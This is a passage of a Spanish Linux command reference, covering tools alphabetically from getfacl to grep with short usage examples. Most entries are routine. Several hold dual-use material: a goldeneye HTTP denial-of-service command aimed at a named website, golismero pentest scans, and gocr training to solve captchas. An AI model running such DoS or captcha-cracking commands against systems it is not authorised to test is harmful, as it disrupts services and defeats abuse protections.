Muestra la lista de control de acceso de archivos o directorios.
$ getfacl /var/www (Muestra propietario, grupo y permisos)
$ getfacl -c /var/www (Sólo muestra los permisos)
$ getfacl -R /var/www (De forma recursiva en todos los archivos y subdirectorios)


gethostip
[syslinux-utils]. Convierte una dirección IP a varios formatos.
$ gethostip -d google.es (muestra la ip del host)
$ gethostip google.es (muestra nombre de host, la IP en formayo decimal y con formato hexadecimal)
$ gethostip -x google.es (sólo con formato hexadecimal)
$ gethostip -f google.es (Genera la dirección IP en todos los formatos admitidos)


getopt
se utiliza para analizar las opciones en líneas de comando para facilitar su análisis por parte de los procedimientos del shell y para comprobar si las opciones son válidas. Por ejemplo, si tiene un script que acepta las opciones -a, -b y -c, getopts permite combinarlas como -abc, -bca o -bac, etc.


getpcaps
Muestra las capacidades en los procesos indicados por el valor pid indicado. Un pid  0 muestra las capacidades del propio proceso que está ejecutando getpcaps.
$ getpcaps --verbose 1247 (del PID mencionado)
Otra forma de ver las capacidades de un proceso:
$  cat /proc/1247/status | grep Cap
$ capsh --decode=00000000a80425fb (para decodificar el número hexadecimal de la salida anterior en CapInh)
Nota.- Cada cláusula consta de una lista de nombres de capacidades separados por comas o la palabra "all" [especifica todas las capacidades], seguida de una lista de acciones. Una lista de acciones consta de una secuencia de pares de indicadores de operador. Los operadores legales son: `=', '+' y `-'. Los flags son: 'e', 'i' y 'p' [Effective, Inheritable y Permitted , Efectivo, Heredable y Permitido ]. all=p" significa reducir todas las capacidades en los conjuntos Effective y Inheritable pero aumentar todas las capacidades Permitted; o "cap_fowner=ep" significa aumentar la capacidad de anulación de propiedad de archivos Effective y Permitted mientras se reduce la capacidad Inheritable. Podemos profundizar en cada capacidad para comprender su significado y función:
     cap_chown: permite que el proceso cambie la propiedad de los archivos
     cap_dac_override: permite que el proceso omita los controles de acceso discrecionales [DAC], lo que le permite acceder a archivos incluso si las comprobaciones de permisos estándar denegarían el acceso.
     cap_audit_write: permite que el proceso escriba registros de auditoría para monitorear y rastrear la actividad del sistema
     cap_setfcap: permite que el proceso establezca capacidades de archivos, que son controles de acceso adicionales más allá de los permisos tradicionales.
     +i – : significa las capacidades heredables que se pueden pasar a procesos secundarios
En el caso de que el operador principal sea '=' o "all=" y no se proporcione una lista de capacidades, se supone que la lista de acciones se refiere a 'todas' las capacidades.



getsebool
Permite listar polí­ticas y determinar si estan activas o inactivas en SELinux, implementación de seguridad para GNU/Linux que provee una variedad de políticas de seguridad a través del uso de módulos de Seguridad en el nucleo de Linux. Ver setsebool
# getsebool -a (Lista todas las políticas, activa o inactivas)
# getsebool -a | grep ftp (conocer que polí­ticas que incluyan la cadena ftp están activas)
	Para el servicio de FTP las políticas serían:
	    allow_ftpd_anon_write (Permite a usuarios anónimos escribir en el servidor)
	    allow_ftpd_full_access (Permite lectura y escritura sobre los archivos del servidor)
	    allow_ftpd_use_cifs (Permite transferencias de datos desde CIFS)
	    allow_ftpd_use_nfs (Permite transferencias de datos desde NFS)
	    ftp_home_dir (Permite a usuarios locales acceder a sus directorios de inicio)


gflags2man
Convierte páginas man en archivos de texto en /tmp.
$ gflags2man ls (Creará el archivo ls.1 en /tmp)


gftp
Cliente para  la tranferencia de archivos. Logs y configuración en ~/.gftp/gftp.log y ~/.gftprc
$ gftp ssh2://USER:PASS@HOST:22/home/USER_REMOTO (Abre la interfaz gráfica)


gftp-text
Cliente ftp. Precisa que el servidor tenga corriendo ftp [vsftpd... ]
$ gftp-text ftp://usuario@host (Pedirá la contraseña y entrará en el promt del servidor)
Nota.- Una vez en el promt:
ftp> help (Para saber los comando disponibles)
ftp> quit (Para salir)


ghostscript
Intérprete del lenguaje PostScript® y de archivos PDF. Incluye las aplicaciones: dvipdf, eps2eps, gs, gsbj, gsdj, gsdj500, gslj, gslp, gsnd, pdf2dsc, pdf2ps, pf2afm, pfbtopfa, pphs, printafm, ps2ascii, ps2epsi, ps2pdf, ps2pdf12, ps2pdf13, ps2pdf14, ps2pdfwr, ps2ps, ps2ps2, ps2txt y update-gsfontmap


gimp
Procesador de imagenes.
Carpetas donde colocar herramientas suplementarias:
Brochas (.gbr)	/usr/share/gimp/2.0/brushes/
Patrones (.pat)     /usr/share/gimp/2.0/patterns
Paletas (.gpl)	/usr/share/gimp/2.0/palettes
Degradados(.ggr)/usr/share/gimp/2.0/gradients


git
[git-core]. Manual completo en español: <http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/es/book.html#_hosting_git_gratuito>
Software de control de versiones. Una vez registrados en Github [<http://github.com>], crear un nuevo repositorio con el nombre escogido y github nos facilitará los datos de acceso [Al estilo: https://github.com/templix/tractatus.git].
Crear el repositorio local de un proyecto alojado en github:
	$ mkdir tractatus (Crear el directorio local)
	$ cd tractatus (Entrar en él)
	$ git init (Inicializar git)
	$ git config --global user.name "nombre_usuario" (Entrar datos del usuario)
	$ git config --global user.mail mail@direccion.com   (Entrar mail)
	$ mv /home/usuario/tractatus.txt . (Mover el archivo al repositorio)
	$ git add tractatus.txt (Añadir el fichero a git)
	$ git commit -a -m 'Inicio del proyecto' (Realizar el primer commit [comentario con los cambios en el proyecto])
	$ git remote add origin https://github.com/templix/tractatus.git (Decirle a nuestra copia local el repositorio remoto donde se alojará)
	$ git push origin master (Enviar los cambios al servidor remoto)
Otros comandos:
$ git clone git@github.com:templix/tractatus.git (Clonar un repositorio por protocolo git)
$ git clone https://github.com/templix/tractatus.git (Clonar un repositorio por protocolo https)
$ git clone ssh://usuario@host.com/home/templix/repositorio repositorio (Clonar por ssh un directorio remoto en local)
$ git config -l (Comprobar todos los parámetros configurados)
$ git config user.email (comrpobar el mail del usuario)
$ git config remote.origin.url (Ver cual es el repositorio remoto)
$ git log (Ver historial de commits)
$ git status (Comprobar si se han efectuado cambios)
$ git config --global credential.helper cache (guarda la contraseña en caché durante 15 min)
$ git config --global credential.helper 'cache --timeout=3600' (guarda la contraseña durante una hora)
$ git rm archivo (Eliminar archivo)
$ git fetch origin (este comando junto con el siguiente elimina todos los cambios locales y pone la versión del servidor)
$ git reset --hard origin/master
$ git diff --color-words archivo1 archivo2  (Mostrar las diferencias en color)
$ git instaweb --httpd=webrick (Abre el proyecto con navegador en localhost:1234)
$ git instaweb --httpd=webrick --stop (Cierra la visualización del proyecto con el navegador)
$ git config --help (Mostrar ayuda de un comando)
$ git log --pretty=oneline (Mostrar listado de push a uno por linea)
$ git commit --amend (editar el último commit para modificarlo)
1.-
Indicar a git archivos o directorios que quedemos excluir del control de versiones.
$ touch .gitignore (Crear el fichero en el directorio raiz del proyecto)
Con el contenido que queremos excluir [Algunos ejemplos]:
	*~
	tmp/*
	*.so
	*.zip
	Thumbs.db
Si el archivo .gitignore lo colocamos en el directorio $HOME afectará a todos los proyectos de git. Para ello lanzar:
$ git config --global core.excludesfile ~/.gitignore
2.-
Descartar modificaciones.
Si una vez realizadas modificaciones en un archivo, antes de lanzar el commit, queremos verlas y descartarlas:
$ git status
$ git diff
$ git checkout -- archivo
3.-
Imprimir todos los repositorios git de un usuario
	$ curl -s https://api.github.com/users/USERNAME/repos?per_page=1000 |grep git_url |awk '{print $2}'| sed 's/"\(.*\)",/\1/'
4.-
Cuando se formatea el disco y se instala nuevamente la distro y git produce un error porqué los datos del usuario y la máquina desde la que se comunicaba han variado respecto de los que constaban:
$ git clone git@github.com:tem... (clonar)
$ git config --global --edit
$ git commit --amend --reset-author
5.-
Normalmente los datos del usuario se guardan en ~/.gitconfig con lo que pueden visualizarse con:
$ cat .gitconfig


git-doc
Documentación en inglés de git. Acceder via navegador a:
	file:///usr/share/doc/git-doc/gittutorial.html


git-shell
Shell de inicio de sesión git pero restringido solo para acceso SSH. Permite la ejecución solo de los comandos Git pull/push, además el administrador puede incluir otros comandos que han de detallarse en un subdirectorio llamado git-shell-commands en el directorio del usuario.


gksu
[gksudo]. Proporciona permisos para que un usuario autorizado pueda ejecutar cualquier programa, script o aplicación como usuario root. El nombre puede variar según distro o escritorio: kdesu en kde, beesu en Fedora...
$ gksu nautilus
$ gksudo nano /etc/resolv.conf


glances
Monitorizar la actividad del sistema en local y modo cliente-servidor.
$ glances (Monitoreo local)
Modo cliente-servidor:
$ glances -s (En el servidor)
$ glances -t 3 -c 192.168.1.10 (En el cliente y actualizando el registro cada 3 segundos [por defecto cada segundo])
Teclas de control:
	h (Oculta / muestra la ayuda)
	a (Muestra los procesos de forma autormatica)
	c (Los muestra por consumo de CPU)
	d (habilitar/deshabilitar estadísticas I/O en disco)
	f (habilita/deshabilita las estadísticas del sistema de archivos)
	l (Oculta / muestra logs)
	m (Muestra los procesos por consumo de  memoria)
	n (Oculta / muestra el estado de los interfaces de red)
	p (Muestra los procesos por orden alfabético)
	w (Elimina los WARNING finalizados del archivo log)
	1 (intercambia entre las estadisticas globales de CPU y las estadisticas particulares por cada CORE)
	q (Salir)
Código de los colores:
	verde (correcto)
	azul (cuidado)
	magenta (Alerta)
	rojo (crítico)


glimpse
Aplicación [GLobal IMPlicit SEarch] consistente en un sistema de indexación y consulta de UNIX que permite buscar rápidamente en un gran conjunto de archivos. Glimpse admite la mayoría de las opciones de agrep, incluida la coincidencia aproximada.
$ glimpse -F '*.sh$' palabra (encuentra "palabra" en todos los archivos .sh)
$ glimpse -2 -F html palabra (todas las ocurrencias de "palabra" con dos errores en los archivos html en algún lugar de su nombre completo.)
$ glimpse -l -F '\.c$' palabra (enumera los nombres de todos los archivos .c que contienen "palabra")


glxinfo
Información sobre las bibliotecas gráficas.
$ glxinfo | grep  rendering  ("yes" indica que la tarjeta gráfica soporta aceleración 3D)
$ glxgears (Lo mismo en modo gráfico. Los engranajes  han de verse de forma decente)


gmail
Correo de google. Permite buscar en el propio correo por palabras clave:
	From:usuario@correo.com (Muestra los recibidos de la dirección)
	To:usuario@correo.com (Muestra los enviados a la dirección)
	Subject:asunto(Busca correos relacionados con "asunto")
	label:etiqueta (busca los clasificados con la etiqueta)
	has:userlabels (lista los clasificados con la etiqueta creada por el usuario)
	has:nouserlabels (lista los clasificados con etiquetas puestas por gmail)
	has:attachment (buscar correos con adjuntos)
	has:attachment ppt (Buscar los que continen adjuntos con la extensión ppt)
	filename:nombre (Busca los que tengan nombre)
	lang:idioma (busca los escritos en un idioma concreto)
	After/Before:AAAA/MM/DD (buscar los posteriores o anteriores a una fecha. Formato: año/mes/día)
	/ (Coloca el cursor en la busqueda)
	? (Muestra los atajos de teclado)


gmount
[google-docs-fs fuse]. Equivalente a mount pero para google docs. Ver tambien google gdrive.
$ gmount google_docs juan@gmail.com -d (sincronizar la carpeta google_docs con la cuenta y mostrando la salida. Pedirá contraseña)
$ gumount google_docs (Desmontar la carpeta)


gmrun
lanzador de aplicaciones.


gnome
Entorno de escritorio
# rm -rf .gnome .gnome2 .gconf .gconfd .metacity (Resetear la configuración)
$ gnome-open archivo.odt   (abrir un archivo con la aplicación asociada a ella por defecto)
$ gnome-open http://web.com   (lo mismo con una dirección web)
Ajustes
1.-
Suprimir rastro de los documentos e imagenes abiertas (lugares -> Documentos recientes):
$ rm .recently-used.xbel
$ mkdir .recently-user.xbel
También:
$ nano .gtkrc-2.0
Si no está se crea. Añadir la linea:
gtk-recent-files-max-age=0
2.-
Acciones sobre gnome y paneles
# killall gnome-panel (Matar el proceso)
# dpkg --purge --force-all gnome-panel gnome-panel-data (Desinstalar)
# apt-get install gnome-panel gnome-panel-data (instalar el panel)
# apt-get install --einstall gnome-panel gnome-panel-data (reinstalarlo)
# /etc/init.d/gdm restart (reiniciar gnome)
# gnome-panel & (lanzar la aplicación)
# pkg-reconfigure xserver-xorg (reconfigurar la seccion gráfica)
# apt-get remove gnome-desktop (desinstalar las X)
# apt-get install gnome-desktop (instalar las X)
# pgrep -lf gnome-panel | awk '{if ($2=="gnome-panel") print $1}' | xargs kill -9 (reiniciar los paneles)
3.-
Carpetas por defecto que aparecen en el directorio /home
$ cat .config/user-dirs.dirs | grep ^XDG
XDG_DESKTOP_DIR="$HOME/Escriptori"
XDG_DOWNLOAD_DIR="$HOME/Baixades"
XDG_TEMPLATES_DIR="$HOME/"
XDG_PUBLICSHARE_DIR="$HOME/Públic"
XDG_DOCUMENTS_DIR="$HOME/Documents"
XDG_MUSIC_DIR="$HOME/Música"
XDG_PICTURES_DIR="$HOME/Imatges"
XDG_VIDEOS_DIR="$HOME/Vídeos"
Para modificarlas editar el archivo:  nano .config/user-dirs.dirs y, si por ejemplo, tenemos las imágenes en /media/sda5/imatges con su entrada en /etc/fstab  Auto, dejamos la entrada correspondiente:
XDG_PICTURES_DIR="/media/sda5/imatges"
Atajos escritorio
	Ctrl+o (Abre la carpeta personal o la del documento abierto)
	Ctrl+Alt+tecla de cursor (Cambia el espacio de trabajo)
	Ctrl+Alt+backspace (Reiniciar entorno gráfico si está activado)
	F1 (Muestra la Ayuda)
	F11 (Pantalla completa)
	Alt+Inicio (Abre la carpeta personal)
	Alt+ImprPant (Realiza una captura de la ventana actual)
	Alt+F1 (Abre el menú aplicaciones)
	Alt+F2 (Abre el cuadro lanzar aplicaciones)
	Alt+F4 (Cierra la ventana activa)
	Alt+F7 (Mueve ventana con las teclas de cursor. Para finalizar pulsar tecla)
	Alt+F8 (Cambia tamaño de ventana con teclas de cursor. finalizar pulsar tecla)
	Alt+F9 (Minimiza)
	Alt+F10 (Maximiza)
	Alt+Ctrl+Shift+teclas de cursor (Mueve la ventana activa a otra área de trabajo)


gnome-keyring
Demonio para gestionar de manera segura las credenciales de acceso del usuario, como los nombre de usuario y las contraseñas. Usando algunos escritorios la consola puede mostrar el error:
WARNING: gnome-keyring:: couldn't connect to: /home/USER/.cache/keyring-s1KHzb/pkcs11: El fichero o directorio no existe
Para resolverlo:
# nano /etc/xdg/autostart/gnome-keyring-pkcs11.desktop
Buscar la linea:
OnlyShowIn=GNOME;Unity;
Y añadir el escritorio usado:
OnlyShowIn=GNOME;Unity;LXDE;Xfce
Reiniciar


gnome-screensaver-command
Herramienta de control del salvapantallas
$ gnome-screensaver-command -l (Bloqueo inmediato)
Opciones
	--exit (Salir de salvapantalla)
	-q (Consulta el estado de la pantalla)
	-t (Tiempo para que entre en acción)
	-a (Activarlo)
	-d (Desactivarlo)


gnome-screenshot
Capturar la pantalla, una ventana o un área definida por el usuario y guardar la imagen instantánea en un archivo.
$ gnome-screenshot -B -w -t captura.png (sin bordes, de la terminal activa y con el nombre mencionado)
$ gnome-screenshot -d 2 -f captura.png (después de pulsar intro, 2 segundos para la captura)
$ gnome-screenshot -b -p -d 3 -f captura.png (con bordes, con el puntero, 3 segundos para la captura y guardada como captura.png)
$ gnome-screenshot -a -f captura.png (el puntero se convierte en una cruz para marcar el area de la captura)


gnome-terminal
Emulador de terminal de gnome.
$ gnome-terminal --hide-menubar --geometry=200x70+0+0 -e "sh -c 'links2 http://google.es'"& (arrancar una terminal, sin menús, con unas medidas concretas y en ella, arrancar el navegador)
Opciones:
	--window-with-profile=perfil2  (especificar un perfil para arrancar)
	--show-menubar  (Mostrar los menús)
	--maximize (maximizada)
	--full-screen (a pantalla completa)
	--zoom=x.x (factor de ampliación de la terminal [--zoom=1.0 medida normal])
atajos:
	Ctrl + a (lleva el cursor al principio de la línea)
	Ctrl + b (Retrocede un carácter)
	Ctrl + c (mata lo que se está escribiendo y devuelve el prompt)
	Ctrl + d (Sale de root y si está como usuario, cierra la terminal)
	Ctrl + e (lleva el cursor al final de la línea)
	Ctrl + f (adelanta un caracter)
	Ctrl + k (Borra de la posición actual al final de la linea)
	Ctrl + l (limpia la pantalla)
	Ctrl + r (Buscar en el historial de comandos. “Esc” editar. “Ctrl +g” abortar “Intro” ejecutar)
	Ctrl + t (Intercambiar las dos letras anteriores al cursor [pieran → pierna])
	Ctrl + u (Borra de la posición actual al principio de la linea)
	Ctrl + w (borra del cursor al primer espacio hacia el principio de la linea)
	Ctrl + y (Deshace la última acción)
	Ctrl + Mayu + t (Abrir nueva pestaña)
	Ctrl + Mayu + w (Cerrar pestaña)
	Esc + d (Borra de la posición actual al final de la palabra)
	Esc + b (Ir una palabra hacia atras)
	Esc + f (Ir una palabra hacia adelante)
	Esc + t (Intercambiar las dos palabras anteriores al cursor [sin tos → tos sin])
	Mayús+RePág (Hace scroll de la terminal hacia arriba)
	Mayús+AvPág (Hace scroll de la terminal hacia abajo)
1.-
Cambiar las medidas por defecto de la terminal:
# nano /usr/share/vte/termcap/xterm
Buscar la linea:
co#80:it#8:li#24:\
Y modificar los parámetros co (columnas) y li (lineas) con las nuevas medidas: co#100:it#8:li#10:\


gnuplot
Programa muy flexible para generar gráficas de funciones y datos.
$ gnuplot (Entrar en el promp de gnuplot)
Una vez en el prompt de la aplicación mostrará de forma gráfica los siguientes datos entrados:
gnuplot> help plot (información)
gnuplot> help functions (funcioones soportadas)
gnuplot> plot sin(x)*cos(x/3)
gnuplot> plot sin(x)*cos(x/3), x/2
gnuplot> plot [-10:10] sin(x), atan(x), cos(atan(x))
	gnuplot> set title "Funciones" (establecer nombre de la gráfica)
	gnuplot> set xlabel "x [grados]" (establecer nombre para las coordenadas)
	gnuplot> set ylabel "y(x)"
	gnuplot> plot [-pi:pi] sin(x) title "sen(x)" with linespoints linetype 4 linewidth 3, atan(x), cos(atan(x))
Otro ejemplo en 3D:
	gnuplot> set xrange [-2:2]
	gnuplot> set yrange [-2:2]
	gnuplot> splot exp(-x * x) * exp(-y * y)
Otro ejemplo a partir de un archivo [en el mismo directorio o especificando la ruta]
	$ cat datos (un archivo con 4 columnas de numeros fraccionales)
	0.10 1.12 23.45 11.11
	0.20 2.12 12.34 22.22
	0.30 2.34 98.23 10.40
	$ gnuplot (entrar en el prompt)
	gnuplot> plot "datos" using 1:2 with lines


gnutls-cli-debug
[gnutls]. Configura múltiples conexiones TLS a un servidor y consulta sus capacidades. Fue creado para ayudar a depurar GnuTLS, pero puede ser útil para extraer las capacidades de un servidor TLS.  Se conecta a un servidor TLS, realiza pruebas e imprime un archivo con las capacidades del servidor.
$ gnutls-cli-debug -p 80 -v localhost (por el puerto 80 y con las máximas comprobaciones)


go2
Buscador de directorios. En Ubuntu es necesario hacer el “--setup”.
$ go2 images (Mostrará una lista de todos los directorios “images” del directorio personal precedidos de una letra [a, b, c...] al pulsarla, entraremos directamente en el directorio especificado)
$ go2 -r carpeta (Busca desde el directorio raiz)
$ go2 -l carpeta (Hace la búsqueda pero sólo muestra el resultado saliendo al acabar dicha búsqueda)
$ /usr/lib/go2/go2.sh --setup (configura nuestro .bashrc para poder llamar al comando con go2 simplemente)


goaccess
Analiza el registro del servervidor web Apache
# goaccess -f /var/log/apache2/access.log (forma básica, especificando el fichero)
# goaccess -f /var/log/apache2/access.log -a -s -b (Habilitar lista de usuarios para el servidor seleccionado [a], activar respuesta de estado HTTP [s] y habilitar el consumo de ancho de banda total [b])
# goaccess -f /var/log/apache2/access.log -a > reporte.html (Mandar resultado a un archivo html)
Nota.- Con la aplicación en marxa, con F1 aparecen las teclas interactivas.


gobrowser
[golang git-core]Administrador de archivos basado en Web.
Instalación:
	# cd /opt
	# git clone https://github.com/xataz/gobrowser.git
	# cd gobrowser
	# go build app.go
Configuración:
$ nano app.conf
Y añadir:
	{
		"listen": ":6001", # Puerto de escucha
		"webroot": "/files", # Si queremos añadir /files para acceder via http://URL:6001/files. En caso contrario dejar vacio ("")
		"path": "/var/www/html/compartido", # Ruta al repositorio de archivos
		"hiddenfile": false # Si no queremos listar lo acultos. "true" para incluirlos
	}
$ ./app (Arrancar el servidor)
2017/04/05 15:14:08 Configfile found !!!
2017/04/05 15:14:08 Starting goBrowser on :6001


gocr
programa que imprime en la salida estándar todo el texto que puede leer de cualquier fichero gráfico de entrada. Usado especialmente para el descifrado de kapchas. El programa necesita cierto aprendizaje.
$ mkdir ocrdb
$ gocr -d 2 -p ./ocrdb/ -m 256 -m 130 kapcha.jpg (El aprendizaje. Lanzar varias veces)
$ gocr -p ocrdb/ -m 2 kapcha.jpg (Comprobar si el programa lo resuelve solo)


gocryptfs
Cifrado de archivos en un directorio que se puede montar. Cada archivo almacena un archivo cifrado correspondiente en el disco duro.
$ mkdir dir_cifrado lugar (Crear directorios, el cifrado y donde se montará [lugar])
$ gocryptfs -init dir_cifrado (Iniciar el proceso. Pedirá contraseña y confirmación)
$ gocryptfs dir_cifrado lugar (montar dir_cifrado en "lugar")
$ touch lugar/archivo.txt (crear un archivo en el dir montado)
$ fusermount -u lugar (desmontar el directorio montado)
$ gocryptfs -passwd dir_cifrado (modificar la contraseña. Primero pide la antigua y luego la nueva y confirmación)
$ gocryptfs -fsck dir_cifrat (chequear la consitencia del directorio cifrado [fsck summary: no problems found])


goldeneye
Es una herramienta de prueba HTTP DoS. Esta herramienta se puede usar para probar si un sitio es susceptible a ataques de denegación de servicio (DoS). Es posible abrir varias conexiones paralelas contra una URL para verificar si el servidor web puede verse comprometido. El programa prueba la seguridad en las redes y utiliza 'HTTP Keep Alive + NoCache' como vector de ataque.
# goldeneye http://lapipaplena.org -m random -d (con metodo HTTP "random", por defecto "get" y debug )


golismero
[python2.7 python2.7-dev python-pip python-docutils git perl nmap sslscan]. Framework para auditorías de seguridad y pentesting que se integra con un montón de soluciones como nmap,nikto,xserv,exploitdb,shodan,sqlmap,etc. Descarga e instalación:
	$ git clone https://github.com/golismero/golismero.git
	$ cd golismero
	# pip install -r requirements.txt
	# pip install -r requirements_unix.txt
# python golismero.py 192.168.1.10 -o report.html (escaneo total de una ip y guardar resultados en report.html
# python golismero.py URL -e sslscan -o report.html (usando un plugin concreto y resultados en report.html)
# python golismero.py localhost -o prueba.html -o prueba.txt --audit-name prueba_localhost (Iniciar la uditoria, que guarde el resultado en .html y .txt y dándole un nombre)
# python golismero.py URL -i nikto_output.csv -o report.html -d all (Importar el resultado de un scaneo con nikto [-i] y desactivando los otros plugins [-d])
# python golismero.py URL -nd (Sin guardar los resultados en la base de datos. Por defecto lo hace automáticamente)
# python golismero.py URL -db database.db -no (Realizar el scaneo y guardarlo en la basa de datos)
# python golismero.py -db database.db -d all -o report.html (Generar un informe a partir de un scaneo guardado en la base de datos)
# python golismero.py plugin (Ver listado de plugins disponibles)
# python golismero.py info brute_* (Ver detalles de un plugin concreto)


goobook
Interfaz en línea de comandos para los contactos de Google que admite: Búsqueda de contactos, agregar nuevos contactos e integración con la aplicación Mutt.
$ goobook authenticate (muestra una url para autorizar a google la aplicación)
$ goobook config-template (crear el archivo de configuración en ~/.goobookrc)
$ goobook dump_contacts (importar todos los contactos en formato xml)
$ goobook query oficina (ver los contactos con la palabra "oficina")
$ goobook reload (actualizar la lista de contactos)


google
Buscador. No reconoce caracteres como el punto [.], el guión [-] o el circunflejo [^], ni distingue entre mayúsculas y minúsculas y es preferible suprimir los articulos ["campo de futbol" por "campo futbol"]". Una curiosidad es el texto "do a barrel roll" y la página da una vuelta completa en la pantalla.
1.-
Palabras clave para mejorar las busquedas
- Comillas - Busquedas textuales ["ludwig van beethoven"]
- Operador lógico "OR" [mayúsculas] - buscar dos conceptos [bach OR wagner]
- Barra vertical - Lo mismo [beethoven|wagner]
- Signo más - Lo mismo [beethoven +wagner]
- Signo menos - Excluir algun concepto [musica -beethoven]
- ~ - Buscar palabras parecidas [~palabra]
- related – parecido al anterior [related:www.site.com]
- link - Buscar páginas que apuntan a otra [link:wwww.host.com]
- info - Recabar información sobre un dominio [info:www.host.com]
- Asterisco - Si se desconoce algún dato ["ludwig * beethoven"]
- filetype - Buscar extensiones concretas [“comandos linux” filetype:pdf]
- site - Restringir resultados por localización geografica [site:.es arroz, armas site:onion.to …]
- cache - Buscar en la cache [cache:wikipedia.org]
- time - Saber la hora de algún lugar [time Sao Paulo]
- sunset - Cuando saldrá el sol en algún lugar [sunset Sao Paulo]
- sunrise - Cuando se pondrá en algún lugar [sunrise Sao Paulo]
- cache - Cuando la página ya no está accesible [cache:www.host.com]
- intitle – las que contengan la palabra o frase en el título [intitle:beethoven]
- allintitle - Las que contengan varias palabras sin necesidad de comillas [allintitle:bach,beethoben]
- intext - Buscar la palabra solo en el texto [intext:bach]
- define – Buscar la definición de una palabra [define:palabra]
- inurl - Buscar por algun detalle en la url [inurl:pipa]
- imagesize - Buscar por tamaño de imágenes [imagesize:320x320]
- linux 2012..2013 - Buscar una palabra en artículos entre un rango de años.
- 58*13 - Usar google como calculadora
- 100USD to EUR - Conversor de divisas [EUR = Euro, USD = Dólar, JPY = Yen, GBP = Libra esterlina, CHF = Franco suizo ...]
- 42km/h to m/s - Convertir km/hora a metros/segundo
- 1024 GB to  kb - Convertir gigabytes a kilobytes
- 26hr to sec - Convertir horas a segundos
- Arroba - Buscar en redes sociales [@wikipedia]
- Sostenido - Buscar hashtags [#wiki]
- Dolar - Buscar por precio [camera $300] o rango de precios [camera $200..$400]
2.-
Gdrive (google-docs-fs)
# mkdir /media/gdrive
# gmount /media/gdrive cuenta@gmail.com -d (Pedirá contraseña de la cuenta y mostrando la salida del comando. Para desmontar: gumount /media/gdrive)


googler
Herramienta en línea de comandos basada en Python para Google (Web & News) y Google Search.
$ googler -N linux
$ googler -w lapipaplena.wordpress.com emacs
$ googler -w amazon.com -w ebay.com digital camera
$ googler -N googler --news
Tambien puede entrarse en el promt de la aplicación y entrar las busquedas (dotemacs):
	$ googler
	Please initiate a query.
	googler (? for help) dotemacs


goto
Ir de un directorio a otro de forma rápida. Descarga e instalación:
	$ wget -O goto.zip "https://github.com/ankitvad/goto/archive/master.zip"
	$ unzip goto.zip
	$ cd goto-master
	# make install
	# cp goto /usr/bin
Uso:
$ goto s descargas (Guardar el presente directorio con el nombre "descargas")
$ goto descargas (Ir al dir "descargas")
$ goto l (Listar los directorios guardados)
$ goto d descargas (Suprimir el atajo guardado con el nombre "descargas")


gpart
Reparar la tabla de particiones.
# gpart /dev/sda (escanear el disco)
# gpart -W /dev/sda /dev/sda (reparar)
# gpart -f -i /dev/sda (escaneo completo [-f] y preguntando si quieres o no activar la partición encontrada [-i])


gpasswd
Añadir usuarios a grupos.
# gpasswd -d usuario video (Para eliminar "usuario" del grupo "video")
# gpasswd -a usuario video (Añadir "usuario" al grupo "video")
# gpasswd -A usuario video (Define a "usuario" como administrador del grupo "video")


gperiodic
Muestra la tabla periódica de los elementos quimicos.


gpe-taskmanager
Abre una ventana en las X informando de las aplicaciones abiertas permitiendo matar el proceso que interesa o ha quedado colgado.
$ gpe-taskmanager


gpg
[gnupg]. Encriptación y autentificación de claves públicas
# gpg --keyserver subkeys.pgp.net --recv-keys XXXXXXXXXXXXXX
# gpg --export --armor XXXXXXXXXXXX | apt-key add -
# gpg --passphrase 1234 -c archivo.txt (Encriptar un archivo con la clave 1234)
# gpg --passphrase 1234 -o xx.gpg -c archivo.txt (Encriptar archivo.txt con la clave 1234 y generando como archivo de salida xx.gpg)
# gpg --dump-options  (visualizar todas las opciones)
# gpg -c archivo.txt (poner contraseña a un texto)
# gpg archivo.txt.gpg (abrir)
# gpg --refresh-keys (refrescar claves)
$ gpg --gen-random --armor 1 8 (Crear una clave aleatoria de 8 caracteres)
$ gpg -ab fichero.txt (Crear una firma para un fichero)
$ gpg --gen-key (Crear las claves. Preguntará algoritmo [RSA/RSA], longitud [2048 bits], caducidad, nombre y correo [opcional])
$ gpg --list-keys (Ver listado )
1.-
Para evitar que la contraseña permanezca en memoria caché  mucho tiempo:
# nano ~/.gnupg/gpg-agent.conf
Y añadir las lineas:
default-cache-ttl 60
max-cache-ttl 120
Luego, recarga la configuración
# gpgconf --reload all


gpgconf
Utilidad para consultar y modificar los archivos de configuración en el directorio .gnupg.
$ gpgconf --reload gpg-agent (informar a gpg-agent de la nueva configuración)
$ gpgconf --list-components (Enumera todos los componentes. Comando por defecto si no se especifica ninguno)
$ gpgconf --check-programs (Enumera todos los programas disponibles y comprueba si se pueden ejecutar)
$ gpgconf --list-dirs (Enumera los directorios usados por gpgconf)


gping
Comprobar si existe conectividad con un dispositivo o acceso a Internet. Como la utilidad ping pero escrita con python y mostrandolo en un gráfico. Se instala con snap:
          # snap install gping
$ gping google.es


gpm
Activar el mouse en las tty1-6. Si al arrancar el servicio [/etc/init.d/gpm start] marca error [fail] buscar el dispositivo:
# find /dev -iname psaux
Y arrancar la aplicación con los datos obtenidos:
# gpm -m /dev/psaux -t ps2
Configuración:
# nano /etc/gpm.conf
	....
	device=/dev/input/mice
	responsiveness=25
	repeat_type=none
	type=exps2
	append=''
	sample_rate=


gpw
Generador de contraseñas pronunciables
$ gpw 5 8  (creará 5 de 8 caracteres)


grabc
Para conocer el color en RGB y exadecimal de algo del escritorio.
	$ grabc
	#1951c2
	25,81,194
El puntero del ratón de convierte en una cruz y al clicar obtiene el color.


graphviz
(meta paquete). Genera gráficos a partir de archivos de texto. Ver pactree o dot porque la aplicación incluye varios ejecutables: acyclic, bcomps, ccomps, circo, cluster, diffimg, dijkstra, dot, dot2gxl, dot_builtins, dotty, edgepaint, fdp, gc, gml2gv, graphml2gv, gv2gml, gv2gxl, gvcolor, gvgen, gvmap, gvmap.shn, gvpack, gvpr, gxl2dot, gxl2gv, lefty, lneato, mingle, mm2gv, neato, nop, osage, patchwork, prune, sccmap, sfdp, tred, twopi, unflatten y vimdot. Generar un archivo con pactree:
$ pactree -g htop > htop
$ dotty htop (muestra el gráfico)


grc
Colorear la salida de los comandos especificados en /etc/grc.conf
$ grc ping www.tuxapuntes.com


grep
Lee la entrada estándar o un archivo e imprime las líneas que cumplan el patrón. Ver expresiones regulares
$ grep -c 'UUID' /etc/fstab (Muestra sólo el número de líneas que coinciden con el patron)
$ grep -n 'UUID' /etc/fstab (Muestra el número de lineas y su contenido)
$ grep -i 'uuid' /etc/fstab (No distingue entre mayusculas ni minúsculas)
$ grep -w 'fstab' /etc/fstab (Ha de coincidir el patron completo, no una parte)
